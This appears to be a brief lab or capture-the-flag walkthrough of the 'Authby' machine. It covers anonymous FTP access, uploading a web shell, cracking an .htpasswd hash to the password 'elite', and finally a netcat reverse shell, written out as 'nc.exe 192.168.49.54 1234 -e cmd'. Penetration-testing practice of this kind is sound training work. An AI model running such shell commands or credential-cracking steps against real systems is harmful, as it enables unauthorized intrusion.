# Authby

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

After scanning for open ports, i saw that i had ftp anonymous with plenty of files, let's see if there are some interesting stuff, i did not find anything interesting accesible&#x20;

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

But it does not work for the moment but i'm able to connect as admin:

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://hackviser.com/tactics/pentesting/services/ftp#reverse-shell-over-website" %}

I'm able to upload a shell:

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

In the admin share we got .htpasswd file:

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

and we're able to crack the hash to admin:elite

looking at the web service:

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

and we are able to log in:&#x20;

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

and i'm able to get a ping back:

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

but no persistent shell so i need to make a better work

so i download this:

{% embed url="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985" %}

and we're able to pop a webshell:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

I tried running reverse shell commands and php and C and powershell but it was not&#x20;

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

so i transfered nc.exe to the target and used it to make a bind shell:

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

since it's windows i have to bind to a cmd shell:

```
nc.exe 192.168.49.54 1234 -e cmd
```

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
